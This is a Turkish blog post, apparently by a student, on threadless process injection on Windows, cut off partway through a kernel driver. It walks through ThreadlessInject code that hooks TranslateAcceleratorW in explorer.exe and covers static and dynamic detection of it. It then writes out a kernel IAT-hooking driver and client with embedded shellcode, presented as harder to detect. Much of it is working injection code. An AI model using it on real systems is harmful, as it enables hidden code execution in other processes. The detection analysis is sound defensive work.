---
layout: post
title: "Threadless Control Flow Hijacking Methods, Analysis and Detection"
categories: blue
date: 2025-07-24
---

Selam bugün staj kabulüm için araştırdığım ve kendisi için tespit mekanizmaları geliştirmeye çalışacağım control flow hijacking konusunu irdeleyeceğiz.

## İÇERİKLER
1. [Nedir bu Control Flow Hijacking ?](#nedir-bu-control-flow-hijacking-)
2. [Basit Bir Saldırı Örneği](#basit-bir-saldırı-örneği)
3. [Basit Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları](#basit-saldırı-örneğine-karşı-statik-ve-dinamik-tespit-mekanizmaları)
4. [Karmaşık Bir Saldırı Örneği](#karmaşık-bir-saldırı-örneği)
5. [Kapanış](#kapanış)


## Nedir bu Control Flow Hijacking ?

Türkçe "kontrol akışını ele geçirme" şeklinde çevirebiliriz. Anlaşıldığı üzere çook geniş bir saldırı spektrumundan bahsediyoruz bu saldırı türünün içine pwn tarafında bufferoverflow ile stack teki ret adresini ele geçirme yahut heapoverflow ile fonksiyon pointer larının üzerine shellcode adresimizi yazmak girebilir. Malware tarafında ise dümdüz hedef process in thread lerinden birini durdurup kendi ayarladığımız context i yükleyip shellcode umuzu çalıştırmak gibi fikirler bu saldırı vektörü altında toplanabilir. Kısaca programın olağan akışını durdurmak, zehirlemek yada değiştirmek gibi her türlü faaliyeti Control Flow Hijacking altında değerlendirebiliriz.

Bu yazıda ilgileneceğimiz control hijack metodları threadless yani process de ekstra bir thread açmadan, thread akışlarına müdahale etmeyen metodlar olacak. Mevcut bir thread in bir şekilde bizim istediğimiz şeyleri yapmasını sağlamalıyız. Bunun için kullanabileceğimiz taktikleri şu şekilde listeleyebiliriz:
 - İşi argümanları alıp başka bir fonksiyona call yada jmp ile gitmek olan bir fonksiyonun gitmeye çalıştığı adres i patch leyebiliriz
 - IAT daki api lere hook atabiliriz böylece mesela program dosya okumak için CreateFile api sini çağırmak istediğinde aslında bizim istediğimiz adresteki kodu çalıştırır
 - exception handler a hook atıp programın bir exception durumunda bizim istediğimiz adresteki kodu çalıştırmasını sağlayabiliriz
 - class sistemi kullanan bir dille derlenmişse program, vtable lardaki fonksiyon adreslerini kendi çalıştırılmasını istediğimiz adresle değiştirebiliriz
 - process deki main module un kullandığı herhangi bir dll deki export edilen fonksiyon adreslerini zararlı kod adresi ile değiştirip mesela kullanıcının user32 deki MessageBox api sini çağırdığı zaman dll in bizim istediğimiz adresi çalıştırmasını sağlayabiliriz
 - bir fonksiyon pointer ı bulup adresini çalıştırılmasını istediğimiz shellcode adresi ile değiştirebiliriz

Şimdilik derleyebildiğim yöntemler bu şekilde. Kernel taraflı yöntemlerin de olduğuna eminim ama bunlar konusunda henüz bir bilgim yok.
Dilerseniz bu yöntemi kullanan ilk saldırı örneğimize geçelim ve yöntemi daha yakından tanıyalım.

## Basit Bir Saldırı Örneği

Basit saldırı örneği için [ThreadlessInject](https://github.com/CCob/ThreadlessInject/tree/master) deki injection kodunu kullanıcaz.
Burdaki fikir hedef process deki main module(exe) un çalıştıracağını bildiğimiz bir fonksiyonu gözümüze kestirip onu hook lamak. Bu ister main module deki bir fonksiyon olsun ister onun kullandığı dll lerdeki. Hook lıcaz.
Hedef fonksiyonun adresini tespit etmek için tersine mühendislik yaparak fonksiyon offset ini bulabiliriz yada pdb file ına erişebildiğimiz yani sembollerine yani spesifik fonksiyonlarının hangi offsetlere veya rva lara yüklendiğini bildiğimiz dll veya exe lerin fonksiyonlarını kullanabiliriz hatta daha da kolayı export edilmiş fonksiyonları hedef alabiliriz bunun için de windows api lerinden yararlanıcaz.
Bunun için öncelikle fonksiyonunu hook lamak istediğimiz module ün handle ını `GetModuleHandle` api si ile alıp o module un bu handle aracılığı ile hangi export edilmiş fonksiyonuna erişmek istiyorsak `GetProcAddress` api sine fonksiyon ismini verip export edilen fonksiyonun adresini cebe atıyoruz.
```csharp
string dll = "user32.dll";
string export = "TranslateAcceleratorW";
var hModule = GetModuleHandle(dll);
if (hModule == IntPtr.Zero)
    hModule = LoadLibrary(dll);
var exportAddress = GetProcAddress(hModule, export);
```
Burda ince bir ayrıntı var ondan bahsetmeden geçmeyelim. `GetModuleHandle` api sinin module handle ını bulamadığı durumda ki bu o anki process imizde bu module yok demek, o module ü `LoadLibrary` api si ile process imize yüklüyoruz. Bakın kafa karışıklığı olmasın burda yükleme yaptığımız process bizim process imiz yani malware process i hedef process değil. Hedef process de yüklü olan bir module malware process de yok ama bize o module deki fonksiyonun adres lazım e napıyoruz. Module u kendi process imize yükleyip bu sayede adresi elde ediyoruz. Windows un knownDLL listesinden (kernelbase.dll, kernel32.dll, user32.dll, ntdll.dll vs.) bir dll i hedef leyeceğiz çünkü bu listedeki dll ler genellikle her process de aynı base address e yükleniyor bu yüzden malware process imizdeki exportAddress %99 diğer process lerde de aynı fonksiyonu barındırıyor olacak. Eğer bir windows dll ine değil herhangi bir dll e hook atmamız gerekseydi adresi tespit etmek için hedef process de biraz daha iş görmemiz gerekecekti neyseki şuanki senaryoda kendi process imizden(malware process) hedef process deki hook adresimizi kolayca hesaplayabiliyoruz.
```csharp
var status = OpenProcess(hedef_process_id, out var hProcess);
```
Hedef process memory sinde dolanabilmek için hedef process in handle ını alıyoruz.

```csharp
var loaderAddress = FindMemoryHole(
    hProcess,
    (ulong)exportAddress,
    ShellcodeLoader.Length + shellcode.Length);
```
Bu fonksiyonun amacı şu:
Hook attığımız adrese bir relative call instruction koyucaz bu call daha önceden allocate ettiğimiz bir bellek bölgesine götürücek bizi ve shellcode umuzda burda olacak neden shellcode u direkt hook attığımız adrese koymuyoruz diye soracak olursan sebebi hook attığımız adresteki fonksiyonun uzunluğu shellcode umuzdan daha küçük ise shellcode execute veya write iznimizin olmadığı bir bölgeye taşabilir buda yazma veya çalıştırma sırasında hata alacağımız anlamına gelir o yüzden hook atma prosüdürü hep bir relative jmp veya call ile başlar sonra trampoline fonksiyonu dediğimiz bir yönlendirici ile devam eder bu projede yazar trampoline fonksiyonu kullanmamış original byte ları hook fonksiyonunda düzeltmiş ve hook fonksiyonun sonunda hook attığımız adrese dönüşü sağlamış, tercih meselesi napcan.
Neyse amacı anlatmaya devam edeyim peki bu `FindMemoryHole` ne işe yarıyor? relative call ile gidebileceğimiz bir aralıkta bir bölgeyi allocate etmeye çalışıyor hudutlarımızı biliyoruz ve çalışıyoruz hesaaabııı.

```csharp
var originalBytes = Marshal.ReadInt64(exportAddress);// originalBytes = *exportAddress şeklinde düşünebilirsiniz burdaki işlemi
GenerateHook(originalBytes);
```
burda hook fonksiyonunun exportAddress deki instruction ları çalıştıktan sonra tekrar düzeltmesi için hook fonksiyonunun içindeki placeholder byte ları exportAddress deki byte lar ile değiştiriyoruz daha önce stub yazmış olanlar olayı anladı. Anlamayanlarda projedeki `GenerateHook` fonksiyonuna şöyle bir bakınca anlayacaktır ne demek istediğimi konudan çok sapmamak için hook fonksiyonun iç mekaniğine çok girmemeyeyim diye düşündüm.

```csharp
ProtectVirtualMemory(
    hProcess,
    exportAddress,
    8,
    MemoryProtection.ExecuteReadWrite,
    out var oldProtect);

var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));//adı üstünde relative call bu yüzden dümdüz hedef adresi değil call ın atıldığı yerden itibaren offset hesaplamamız lazım +5 relative call instruction boyutu için
var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };

using var ms = new MemoryStream(callOpCode);
using var br = new BinaryWriter(ms);
br.Seek(1, SeekOrigin.Begin);
br.Write(relativeLoaderAddress);

status = WriteVirtualMemory(
    hProcess,
    exportAddress,
    callOpCode,
    out var bytesWritten);
```
Bu kısımda exportAddress e hook fonksiyonuna zıplayan relative call instruction ını yazıyoruz. Yukarda bahsettiğim gibi hook fonksiyonuna aslında burda olan byte ları yerleştirdiğimiz için bu yaramazlığımızı düzeltip programın hiçbir şey olmamış gibi çalışmaya devam etmesini sağlayabilecez.<br>

```csharp
status = ProtectVirtualMemory(
    hProcess,
    (IntPtr)loaderAddress,
    (uint)payload.Length,
    MemoryProtection.ReadWrite,
    out oldProtect);

status = WriteVirtualMemory(
    hProcess,
    (IntPtr)loaderAddress,
    payload,
    out bytesWritten);

status = ProtectVirtualMemory(
    hProcess,
    (IntPtr)loaderAddress,
    (uint)payload.Length,
    oldProtect,
    out _);
```
Bu işlemlerle önceden hook fonksiyonumuza tahsis ettiğimiz adrese(loaderAddress diye geçiyor kodda)(`FindMemoryHole` fonksiyonu ile allocate ettiğimiz adres) hook fonksiyonumuzu yazıyoruz.

explorer.exe `TranslateAcceleratorW` api sini neredeyse her saniye çağırıyor o yüzden onu hook lamak istedim. Görelim.
<video width="640" height="360" controls>
  <source src="/videos/control-flow-hijack-basic-poc.mkv" type="video/mp4">
  Tarayıcınız video etiketini desteklemiyor.
</video>
Projenin son halini link olarak veriyim isteyen direkt ordan baksın, daha rahat. Neden size bu rahatlığı sunmıyım ki.
<a href="/projects/ThreadlessInject_last_version.rar">Projenin son hali</a>

## Basit Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları
Şimdi az önce incelediğimiz proje yi derleyerek elde ettiğimiz exe nin yaptığı bu saldırıyı statik ve dinamik şekillerle nasıl tespit edebiliriz bunu irdeleyeceğiz.

### Statik Tespit
Öncelikle programın kodu pack halinde mi basitçe bu ihtimali eleyelim yoksa packer ın fonksiyonları ve api çağrılarından başka bişey bulamayabiliriz. Bunu anlamak için section ların entropy değerlerine bakabiliriz entropy 7 veya daha yüksekse büyük ihtimal bir packer la uğraşacağız demektir.
![die2](/pictures/die2.png)
Zaten bildiğimiz üzere bu projede bir pack olayı yok. Devam edelim.

Bizim derlediğimiz program .net binary si olarak derlendi, CIL instruction içeriyor. Bu saldırıyı yapan başka binary ler native binary olabilir yani direkt makine kodu içerebilir. Statik inceleme için önce bunu tespit etmemiz lazım çünkü binary yapıları ve içerikleri daha farklı ve bakmamız gereken yerlerde farklı olacaktır.
Windows ortamındaki executable binary nin .net binary si mi native binary mi olduğunu anlamanın anladığım kadarıyla en temiz ve kısa yollarından biri binary deki CLR Header ının varlığını kontrol etmek bu Header Microsoft un CIL instruction larını runtime esnasında çalıştıran motorun ihtiyaç duyduğu bilgileri ve debugging için de bazı kolaylaştırıcı bilgiler içeren bir bölüm. Bu bölümün konumunu elde etmek için PE_HEADER -> OPTIONEL_HEADER -> DATA_DIRECTORY -> CLR_RUNTIME_HEADER a bakmalıyız burada CLR_HEADER ın rva sı ve uzunluğu bilgisi var eğer baktığımız binary bir native binary ise bu kısımlar boş olacaktır dilerseniz rva yı kullanarak CLR_HEADER a da bakabilirsiniz ama benim için address bilgisinin varlığı kafi şimdilik.
![die1](/pictures/die1.png)

Peki şimdi ne yapacaz? Anladık ki bir .net binary si ile uğraşıyoruz peki bunun statik analizini nasıl yapabiliriz içinde threadless control flow injection saldırısı nın kodlandığını nasıl kanıtlayabiliriz?
 - Kullanılan windows api lerine bakabiliriz
 - .net binary leri genellikle derlenirken asıl koddan pek çok değişken ve fonksiyon ismini içinde barındırır eğer malware yazarı akıllıysa bunları silmiştir peki ya değilse?
 - Koda bakabiliriz tabiki:D Eğer can sıkıcı derecede obfuscate edilmemişse. Edilse bile bakmak lazım koda bakmak çok önemli adamım

Şimdilik aklıma gelen noktalar bunlar. Hadi kazalım.
Şimdik canlar, eğer native bir binary ile uğraşıyor olsaydık dümdüz kullanılan yani dinamik olarak çağrılmayan derleme esnasında Windows.h dan çekilen api ler exe nin içindeki import table a gömülür ve runtime esnasında windows bu import table a bakıp istediğimiz windows dll lerini process imize dahil eder bu dll lerden talep ettiğimiz fonksiyonları da import table daki yerlerine adreslerini yazar. Bizimde hangi api ler kodda statik olarak kullanılmış bakmak için exe nin içindeki import table a bakmamız yeter ama .net binary lerinde import table a bakmaya kalkıştığımızda ilginç bir tablo ile karşılaşırız.
![die3](/pictures/die3.png)
import edilen tek dll mscoree.dll bu dll den çekilen tek fonksiyon/api ise _CorExeMain
Vattafak, hayırdır. nerde ntdll.dll nerde kernel32.dll? Bunlar bazı sistem process leri hariç neredeyse her process de olan her exe nin içine exe sahibine sorulmadan import edilen dll ler değiller mi? Burda neden yok, yoksa bu program o kadar havalı da bu dll leri kullanmayı red mi ediyor? Cevap hayır. Programı çalıştırıp process hacker gibi bir process inceleyeci ile process e dahil edilen module lere bakarsanız bayada dll in aslında import edildiğini görürsünüz.
![die4](/pictures/die4.png)

Peki neler dönüyor? Kodda LdrLoadDll, NtWriteVirtualMemory gibi api lerin çağrıldığını biliyoruz ama exe nin import table ında sadece mscoree.dll gözüküyor.
Aslında bu CLR(Common Language Runtime) motoruyla alakalı. Detaylarda boğulmanın anlamı yok kısaca mscoree.dll CLR yi kullanarak CIL instruction larını runtime esnasında derler ve çalıştırır. Bu arada CIL instruction ların erişmeye çalıştığı api ler gene runtime esnasında dinamik olarak import edilir ve kullanılır. İyide biz statik analiz yapıyoruz çalışma zamanını gözlemlemeden bu api leri nasıl bulucaz? Aslında .net binary leri bize import table ın çok daha gelişmiş bir versiyonunu sunar buraya da az önce içine girmediğimiz CLR_HEADER dan gidilir. CLR_HEADER ın içindeki Metadata bloğundan CLR_METADATA rva sını bulalım
![maltcat1](/pictures/malcat1.png)

CLR_METADATA nın içindeki StreamHeader lardan ilki bizi CLR_TABLES bölümüne götürücek. offset i alıp  CLR_METADATA ya eklediğimizde CLR_TABLES a geliyoruz.
![malcat2](/pictures/malcat2.png)

CLR_TABLES ın başlangıcı, alta doğru diğer table lar geliyor
![malcat3](/pictures/malcat3.png)

Bu table ların içinde ise yok yok. Ben analizimiz için önemli bulduğum birkaç tanesini açıklayacağım:
 - TypeRef: dışardan import ettiğimiz bütün class lar ve onun gibi şeyler(type ın genel kümesini bilmiyorum) burda. Mesela kodda kullandığımız Process class ı
 - ImplMapTable: native fonksiyonların tutulduğu yer de burası <3. LdrLoadDll, NtOpenProcess, NtAllocateVirtualMemory... [DllImport("ntdll.dll")] şeklinde csharp koduna eklenen method lardan bahsediyorum.
 - MemberRefTable: dışardan import ettiğimiz class lardan çekip kullandığımız method larda burda. GetCurrentProcess, GetProcessesByName...

Ve daha nice bilgi. İstersek kodda kendimizin hazırladığı fonksiyon ve class ları veya parametreleri de çekebiliriz. Bunların kolayca derlemeden önce obfuscate edilme ihtimali çok yükek olduğu için yazıda bakmıcam ama yukarda da söylediğim gibi ya malware yazarı unuttuysa ihtimali için size kendi işlerinizde buralara da bi şans vermenizi öneririm.

Table ların yapısı türlerine göre biraz farklı olabiliyor ama sonuç itibariyle hepsinin içinde tablodaki her bir eleman için bir name değeri var bizde bunlara bakıcaz. Bunun için python kullanıcam kütüphane olarak da dnfile.
```python
import dnfile

dn = dnfile.dnPE("ThreadlessInject.exe")
for table_name in ["TypeRef", "MemberRef", "ImplMap"]:
            table = getattr(dn.net.mdtables, f"{table_name}", None)
            if not table: continue
            for row in table.rows:
                value = ""
                if hasattr(row, "TypeName"):
                    value = (row.TypeName.value)
                elif hasattr(row, "ImportName"):
                    value = (row.ImportName.value)
                else:
                    value = (row.Name.value)
                print(f"{table_name}: {value}")
```
ImplMap bizim için çok şey söylüyor:
```
ImplMap: RtlInitUnicodeString
ImplMap: LdrLoadDll
ImplMap: NtOpenProcess
ImplMap: NtAllocateVirtualMemory
ImplMap: NtProtectVirtualMemory
ImplMap: NtReadVirtualMemory
ImplMap: NtWriteVirtualMemory
ImplMap: NtFreeVirtualMemory
ImplMap: CloseHandle
ImplMap: GetProcAddress
```

Bizim en basit haliyle bir threadless control flow hijacking saldırısından beklentimiz adım adım:
1. Hedef process deki çalıştırılan bir adrese erişmek
2. Hedef process e zararlı kod yüklemek
3. eriştiği adresin çağrıldığı yeri manipüle edip çağrılan adresi kendi zararlı kodunun olduğu adresle değiştirmek

ImplMap da gördüğümüz:
- NtOpenProcess: Hedef process e erişmek için
- NtAllocateVirtualMemory: eriştiği process de kendine kodunu yükleyecek bir alan tahsis etmek için
- NtProtectVirtualMemory: .text section un daki sadece execute veya read izni olan yerlerdeki instruction ları değiştirmek amacıyla bu bölgelere write izni eklemek için
- NtReadVirtualMemory: Hedef process de bazı adreslerde neler olduğunu görmek için
- NtWriteVirtualMemory: Hedef process deki adreslerde istediği şekilde değişiklik yapmak için kullanılabilir.
- Kullanılmayadabilir belkide sadece kendi process iyle ilgileniyordur bunu anlamak için kod analizi lazım ki kodun ne olduğunu bildiğimiz için bunu yapmayacağım.

### Dinamik Tespit

Şimdi sıra dinamik olarak bu tehditleri tespit etmekte bunun için .net uygulaması ise dnspy native ise xdbg kullanırdım ama zaten kodu bildiğimiz için apimonitor ile tespit yapmanın daha mantıklı olacağını düşündüm.
[ApiMonitor](http://www.rohitab.com/apimonitor) 3. part geliştiriciler tarafından yapılan bir uygulama yaptığı şeyde kısaca seçtiğimiz api lere breakpoint koyup program oralara gelince bize çağrılan api leri ve içeriklerini listelemek aslında debugger gibi çalışıyor.
Programı açıp...

Yok hacı ben bu uygulamayı cidden sevemiyorum ya sıkıntılı. .net process ini açtıramadım adama. Aslında programı işlemlere başlamadan önce `Console.ReadLine()` ile duracak şekilde ayarlayıp başlattıktan sonra attach yapsam büyük ihtimal sorunsuz debug edecek ama gerçek bi senaryoda malware yazarlarının bize böyle bir güzellik yapacağını sanmam sonuç olarak sıfırdan bir process açmak ve dinleme yapmak konusunda apimonitor hiç iyi değil gibi. Yada ben kullanmasını bilmiyorum.

Şimdi dediğim şeyi yaptım yani programın başına `Console.ReadLine()` ekledim ve gene hata aldım. İyice kıllandım ve Program kapanmadan önce nerde çöktüğünü görmek için video çekip o ana baktım.
![error1](/pictures/error1.png)
Gördüğünüz gibi hata exportAddress in üzerine yazılmaya çalışıldığında oluyor bu adres normalde write iznine sahip değil ama biz yazmadan hemen önce `ProtectVirtualMemory` ile izni veriyorduk, sanırım exportAddress in `TranslateAcceleratorW` api sinin başlangıç adresi olması dolayısıyla apimonitor de bu adresle ilgileniyor ve tam olarak nedenini anlayamadığım bir çakışma yaşanıyor. write izni verdiğim adrese veri yazamıyorum sonuç olarak. ApiMonitor yüzünden.

Bu yüzden api çağrılarını yakalamak için daha ne yaptığından emin olduğum bir program kullanmak istiyorum, karşınızda [dnspy](https://github.com/dnSpy/dnSpy).<br>
Tekrar fake yedim bu programında native api lere breakpoint koyma gibi bir kabiliyeti yokmuş o zaman dostumu çağırayım bende [xdbg](https://x64dbg.com/).<br>
Bu güzelim debugger a programımızı atıp başlatınca bizi ntdll.dll e durduracaktır ilk hetapta. Bir güvenli nokta protokolü gibi buraya kendisi hep otomatik breakpoint koyuyor breakpoint in adı da System Breakpoint isterseniz ayarlardan kapatabilirsiniz ama önermem çünkü process üzerinde neredeyse mutlak bir hakimiyet veriyor size, os loader ın process i oluşturma aşamasında ilk thread bile başlatılmadan önce tetiklenen bir breakpoint. Yani tam manasıyla program daha hiçbir şey yapamamaya bile başlamamışken programın akışına müdahale edebilme hakkınız oluyor. Tam bu noktada symbol sekmesinde ntdll.dll deki şüpheli api lere(bizim durumumuzda threadless control flow hijack e yol veren api ler) breakpoint koyup programın bunlara basıp basmayacağını kontrol edebiliriz tabiki dinamik bir analiz yaptığımız için cidden bir malware ile çalıştığımız zaman bu işlemi vm de yapmak gerekir. ChatGPT ye bu işlem için kullanılabilecek tüm api leri sorarız yada internetten araştırın hangi şekilde isterseniz:D sonra bu api lere breakpoint koyarız. Tabiki programın içinde antidebug mekanizmaları varsa bu plan hiçbir işe yaramaz ama bu başka bir videonun konusu bizim bu konuda öngördüğümüz programlar pack edilmemiş ve antidebug koruması olmayan programlar:D

Koyduğum breakpoint lerden `NtOpenProcess` tetikleniyor Threadless projesini yazan adam tespiti azaltmak için hep ntdll level api ler kullandığından bu api ler de genelde daha meşgül olduğundan explorer.exe nin process ini açan `NtOpenProcess` çağrısından önce 2-3 kere kendi process imizi açtığımız birkaç tetiklenme geçiriyoruz.
[https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess) linkinden `NtOpenProcess` api sinin argüman sıralamasına baktığımızda pid girdisinin 4. argümanda adresi şeklinde verildiğini görüyoruz buda r9 register ına tekabül ediyor hemen o adrese gidiyoruz ve cidden explorer.exe pid inin `NtOpenProcess` e verilerek bu process e erişilmeye çalışıldığını görüyoruz.
![xdbg1](/pictures/xdbg1.png)

Debugger ı devam ettirdiğimde bu seferde `NtWriteVirtualMemory` api sinin tetiklendiğini görüyoruz. Bu api msdn de dökümanlandırılmamış herhalde burdan argümanlarına bakalım -> [https://ntdoc.m417z.com/ntwritevirtualmemory](https://ntdoc.m417z.com/ntwritevirtualmemory)
İlk argümanı veri yazmak istediği process in handle ıymış bakalım hangi process e yazıyormuşuz. Handle ın ne handle ı olduğunu öğrenmek için basitçe Process Hacker kullanabiliriz.
![xdbg2](/pictures/xdbg2.png)
Görüldüğü üzere ilk argüman yani rcx e baktığımızda gördüğümüz handle explorer.exe nin process handle ı.

Biraz daha bakalım bu api ye mesela BaseAddress i doğrulayalım o da ikinci argüman yani rdx de imiş.
![xdbg3](/pictures/xdbg3.png)
Yine görüldüğü üzere bu da gerçekten `TranslateAcceleratorW` api sinin başlangıç adresi yani buraya veri yazılacak, yazılacak şeye de bakmaya çalışalım. 3. argüman yazılacak verinin adresi, 4. argüman ise ne kadar yazılacağı bilgisi sıra ile r8 ve r9 register larına tekabül ediyorlar. r9 önceki ss lerden de gördüğünüz gibi 5 byte ki bu hatırlarsınız ki yazacağımız relative call ın uzunluğu idi.
![xdbg4](/pictures/xdbg4.png)
Gerçekten de hem dump da hemde disassembly ekranında göreceğiniz üzere bu da yazacağımız relative call instruction u.

Artık explorer.exe process ine erişilip onun `TranslateAcceleratorW` api sine hook atıldığını kanıtlamış olduğumuza göre dinamik olarak saldırıyı tespit ettiğimizi de söyleyebiliriz.

## Karmaşık Bir Saldırı Örneği

Şimdi biraz fantazi zamanı. Bu sefer daha karmaşık bir hijack işlemi yapmaya çalışalım mesela yukarda değindiğimiz metodlardan IAT hooking gibi.
Bunun için öncelikle Import Directory Table a ulaşmamız lazım ki bu table `CLR_RUNTIME_HEADER` olduğu yerde yani `DATA_DIRECTORY` de, içeriğinde rva ve size bilgisi vardır. rva yı kullanarak `IMAGE_IMPORT_DESCRIPTOR` structure array ine ulaşırız Bu array deki her bir `IMAGE_IMPORT_DESCRIPTOR` binary mize import edilmiş bir dll i temsil eder `IMAGE_IMPORT_DESCRIPTOR` içinde bakacağımız 3 veri var:
Name: dll ismine giden rva
OriginalFirstThunk: INT(Import Name Table) ın rva sını tutar
FirstThunk: IAT(Import Address Table) ın rva sını tutar

bu verileri sırayla kontrol ederek binary mize import edilmiş istediğimiz fonksiyonu bulabiliriz.
Name e bakarak hangi dll de olduğumuzu biliriz. `INT` derleme esnasında doldurulan bir bölümdür o dll deki hangi fonksiyonlara ihtiyacımız varsa onları isim yada ordinal şeklinde tutar.
`IAT` runtime e kadar içerik olarak `INT` gibidir. Runtime esnasında os loader tarafından `INT` da istenen fonksiyon ların adresleri ile doldurulur.
Yani yapacağımız şey. İstediğimiz fonksiyon ismini bulana kadar her `IMAGE_IMPORT_DESCRIPTOR` un içindeki `INT` ve `IAT` ı eş sırayla kontrol etmek. `INT` ve `IAT` paralel ilerlediğinden ne zaman `INT` da hook atmak istediğimiz fonksiyonun ismini bulursak tam o anda `IAT` da da o fonksiyonun adresi olduğunu bildiğimizden adresi elde edip hook işlemine başlayabiliriz.

Tespiti daha zor olsun diye bu işlemi user mode da değil de kernel mode da yapmaya karar verdim hem işler daha heyecanlı hale gelmiş olur:D
Bunun için bir kernel driver ve user mode dan bu driver la iletişim kuracak bir IOCTL client yazmamız lazım.
client:
```cpp
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define IOCTL_IAT_PATCH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define MAX_PIDS 1024

typedef struct _INJECTION_DATA {
    int pid;
    char functionName[256];
} INJECTION_DATA;

int GetPIDsByProcessName(const char* targetProcessName, DWORD* pidArray, int maxCount) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    int count = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (strcmp(pe32.szExeFile, targetProcessName) == 0) {
            if (count < maxCount) {
                pidArray[count++] = pe32.th32ProcessID;
            }
            else {
                break;
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return count;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Argumanlaaaaaarr!");
        return 1;
    }
    const char* importedFunctionName = argv[2];
    HANDLE hDevice = CreateFile("\\\\.\\IATPatch", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Driver not found. errrocode: %d\n",GetLastError());
        return 1;
    }
    DWORD pids[MAX_PIDS];
    int pids_c = GetPIDsByProcessName(argv[1], pids, MAX_PIDS);
    for (int i = 0; i < pids_c; i++) {
        INJECTION_DATA data;
        data.pid = pids[i];
        memset(data.functionName, 0, sizeof(data.functionName));
        memcpy(data.functionName, importedFunctionName, min(strlen(importedFunctionName), sizeof(data.functionName) - 1));
        DWORD ret;
        BOOL ok = DeviceIoControl(hDevice, IOCTL_IAT_PATCH, &data, sizeof(data), NULL, 0, &ret, NULL);
        if (ok) {
            printf("IAT patch request sent for pid: %d\n",pids[i]);
        }
        else {
            printf("IOCTL failed: %lu\n", GetLastError());
        }
    }
    CloseHandle(hDevice);

    return 0;
}
```
BU client argüman olarak process name ve fonksiyon ismi alıyor sonra o process name de kaç tane pid varsa topluyor ve herbiri için hook lanıcak import table daki fonksiyon ismi ile beraber driver a IOCTL isteği atıyor.

driver:
```c
// driver.c
#define _WIN10_
#include "Loader.h"

#define DEVICE_NAME     L"\\Device\\IATPatch"
#define SYMLINK_NAME    L"\\DosDevices\\IATPatch"
#define IOCTL_IAT_PATCH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IMAGE_ORDINAL_FLAG 0x8000000000000000

typedef struct _INJECTION_DATA {
    int pid;
    char functionName[256]; // shellcode address
} INJECTION_DATA, * PINJECTION_DATA;

unsigned char CalcX64[] = {
        0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
        0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
        0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
        0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
        0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

unsigned char ShellcodeLoader[] = {
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90
};

NTSTATUS FindMemoryHole(
    HANDLE hProcess,
    ULONGLONG exportAddress,
    SIZE_T size,
    PVOID* outAllocatedAddress
) {
    ULONGLONG start = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
    ULONGLONG end = exportAddress + 0x70000000;
    ULONGLONG addr;
    SIZE_T regionSize = size;
    PVOID baseAddress = NULL;
    for (addr = start; addr < end; addr += 0x10000) {
        baseAddress = (PVOID)addr;
        regionSize = size;
        NTSTATUS status = ZwAllocateVirtualMemory(
            hProcess,
            &baseAddress,
            0,
            &regionSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
        if (NT_SUCCESS(status)) {
            *outAllocatedAddress = baseAddress;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

PVOID GetImportedFunctionAddress(PVOID moduleBase,const char* targetFuncName) {
    if (!moduleBase) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((unsigned char*)moduleBase + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
